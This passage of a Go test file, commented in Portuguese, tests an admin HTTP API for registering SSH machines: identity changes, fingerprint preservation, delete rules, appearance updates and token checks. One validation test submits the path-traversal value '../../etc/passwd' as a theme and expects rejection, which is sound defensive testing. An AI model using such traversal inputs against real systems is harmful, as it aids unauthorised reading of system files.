		t.Fatalf("status %d, esperava 400: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "unknown_identity" {
		t.Errorf("erro = %q", got)
	}
	if m, _ := mreg.Get("vps"); m.Identity != "vx" {
		t.Errorf("a identidade mudou mesmo com a nova sendo inválida: %q", m.Identity)
	}
}

// Trocar de identidade (host e porta iguais) não derruba o fingerprint nem o
// SO: os dois são do host, e quem entra nele é assunto separado. Confirma na
// camada HTTP a regra já coberta em internal/machine.
func TestPatchMachineTrocaIdentidadeMantemFingerprintEOS(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	_ = mreg.SetOS("vps", "Darwin 24.5.0")
	if _, err := idents.Add(machine.Identity{Name: "outra", Username: "deploy"}, ""); err != nil {
		t.Fatalf("Add: %v", err)
	}

	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPatch, "/machines/vps", `{"identity":"outra"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	m, _ := mreg.Get("vps")
	if m.Identity != "outra" || m.Dest != "deploy@192.0.2.50" {
		t.Errorf("troca de identidade não pegou: %+v", m)
	}
	if m.HostFingerprint != "SHA256:confirmado" {
		t.Errorf("trocar de identidade derrubou o fingerprint: %q", m.HostFingerprint)
	}
	if m.OS != "Darwin 24.5.0" {
		t.Errorf("trocar de identidade limpou o SO: %q", m.OS)
	}
}

// A chave é da IDENTIDADE, e pode estar em uso por outras máquinas: apagar o
// CADASTRO de uma máquina não pode apagá-la. Quem apaga é o DELETE
// /identities/{identity}, e só quando nenhuma máquina a usa mais.
func TestDeleteMachineApagaOCadastroMasNaoAChave(t *testing.T) {
	mreg, idents := registroComVPS(t)
	keys := newFakeKeys()
	rec := doAdmin(t, mreg, keys, idents, http.MethodDelete, "/machines/vps", "")
	if rec.Code != http.StatusNoContent {
		t.Fatalf("status %d, esperava 204: %s", rec.Code, rec.Body.String())
	}
	if _, ok := mreg.Get("vps"); ok {
		t.Error("a máquina continua no registro")
	}
	if len(keys.removed) != 0 {
		t.Errorf("a chave da identidade foi apagada por um DELETE de máquina: %v", keys.removed)
	}
}

// Remover máquina do env não pode nem tocar na chave: ela nem é do cadastro.
func TestDeleteMachineDoEnvE403(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	idents := identidadeComChave(t, "vx", "vx")
	keys := newFakeKeys()
	rec := doAdmin(t, mreg, keys, idents, http.MethodDelete, "/machines/macbook", "")
	if rec.Code != http.StatusForbidden {
		t.Fatalf("status %d, esperava 403", rec.Code)
	}
	if len(keys.removed) != 0 {
		t.Errorf("apagou chave de máquina do env: %v", keys.removed)
	}
	if _, ok := mreg.Get("macbook"); !ok {
		t.Error("a máquina do env sumiu do registro")
	}
}

func TestDeleteMachineInexistenteE404(t *testing.T) {
	idents := identidadeComChave(t, "vx", "vx")
	rec := doAdmin(t, machine.NewRegistry(nil), newFakeKeys(), idents, http.MethodDelete, "/machines/fantasma", "")
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status %d, esperava 404", rec.Code)
	}
}

// MARK: PUT /machines/{n}/appearance

func TestPutAppearanceTrocaTemaEIcone(t *testing.T) {
	mreg, idents := registroComVPS(t)
	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPut, "/machines/vps/appearance",
		`{"theme":"dracula","icon":"apple"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	m, _ := mreg.Get("vps")
	if m.Theme != "dracula" || m.Icon != "apple" {
		t.Errorf("aparência não pegou: %+v", m)
	}
	// O app desenha o ícone a partir daqui: se não vier na resposta, a tela volta
	// ao valor antigo assim que recarrega.
	if !strings.Contains(rec.Body.String(), `"icon":"apple"`) {
		t.Errorf("o ícone não voltou na resposta: %s", rec.Body.String())
	}
}

// PUT, não PATCH: vazio é escolha ("Padrão"/"Automático"), não omissão. É este
// caso que o PATCH não conseguia expressar.
func TestPutAppearanceVaziosVoltamAoPadrao(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_, _ = mreg.SetAppearance("vps", "nord", "pc")

	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPut, "/machines/vps/appearance",
		`{"theme":"","icon":""}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	if m, _ := mreg.Get("vps"); m.Theme != "" || m.Icon != "" {
		t.Errorf("vazio não voltou ao padrão: %+v", m)
	}
}

// A rota existe separada do PATCH exatamente para não ter como derrubar a
// confiança do host. Aparência não afeta conexão.
func TestPutAppearanceNaoDerrubaFingerprintNemSO(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_ = mreg.SetFingerprint("vps", "SHA256:confirmado")
	_ = mreg.SetOS("vps", "Darwin 24.5.0")

	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPut, "/machines/vps/appearance",
		`{"theme":"oneDark","icon":"server"}`)
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d, esperava 200: %s", rec.Code, rec.Body.String())
	}
	m, _ := mreg.Get("vps")
	if m.HostFingerprint != "SHA256:confirmado" || m.OS != "Darwin 24.5.0" {
		t.Errorf("aparência mexeu em fingerprint ou SO: %+v", m)
	}
	if m.Dest != "vx@192.0.2.50" || m.Port != 2222 {
		t.Errorf("aparência mexeu no destino: %+v", m)
	}
}

func TestPutAppearanceIDMalformadoE400(t *testing.T) {
	mreg, idents := registroComVPS(t)
	_, _ = mreg.SetAppearance("vps", "nord", "apple")

	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPut, "/machines/vps/appearance",
		`{"theme":"../../etc/passwd","icon":""}`)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status %d, esperava 400: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "invalid_appearance" {
		t.Errorf("erro = %q", got)
	}
	if m, _ := mreg.Get("vps"); m.Theme != "nord" || m.Icon != "apple" {
		t.Errorf("a recusa mexeu na aparência guardada: %+v", m)
	}
}

func TestPutAppearanceDoEnvE403EInexistenteE404(t *testing.T) {
	mreg := machine.NewRegistry([]machine.Machine{
		{Name: "macbook", Dest: "vx@host", Port: 22, Source: machine.SourceEnv},
	})
	idents := identidadeComChave(t, "vx", "vx")

	rec := doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPut, "/machines/macbook/appearance", `{"theme":"nord"}`)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("env: status %d, esperava 403: %s", rec.Code, rec.Body.String())
	}
	if got := erroDe(t, rec); got != "read_only" {
		t.Errorf("env: erro = %q", got)
	}
	if m, _ := mreg.Get("macbook"); m.Theme != "" {
		t.Errorf("a máquina do env aceitou tema: %+v", m)
	}

	rec = doAdmin(t, mreg, newFakeKeys(), idents, http.MethodPut, "/machines/fantasma/appearance", `{"theme":"nord"}`)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("inexistente: status %d, esperava 404: %s", rec.Code, rec.Body.String())
	}
}

// MARK: token

// Cadastrar máquina instala chave em host remoto: nenhuma dessas rotas pode
// ficar aberta como o board.
func TestRotasDeCadastroExigemToken(t *testing.T) {
	casos := []struct{ method, path, body string }{
		{http.MethodPost, "/machines", `{"name":"vps","host":"y","identity":"vx"}`},
		{http.MethodPatch, "/machines/vps", `{"host":"y"}`},
		{http.MethodDelete, "/machines/vps", ""},
		{http.MethodPost, "/machines/vps/trust", `{"fingerprint":"SHA256:x"}`},
		{http.MethodPost, "/machines/vps/install-key", `{"password":"x"}`},
		{http.MethodPost, "/machines/vps/detect-os", ""},
		{http.MethodPut, "/machines/vps/appearance", `{"theme":"nord"}`},
	}
	for _, c := range casos {
		mreg, idents := registroComVPS(t)
		keys := newFakeKeys()
		rec := doAdminRaw(t, mreg, keys, idents, c.method, c.path, c.body, false)
		if rec.Code != http.StatusUnauthorized {
			t.Errorf("%s %s: status %d, esperava 401", c.method, c.path, rec.Code)
		}
		if keys.installCalls != 0 || keys.detectCalls != 0 || len(keys.generated) != 0 {
			t.Errorf("%s %s: agiu sem token", c.method, c.path)
		}
	}
}

// jsonStr escapa uma string para dentro de um corpo JSON montado à mão.
func jsonStr(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}
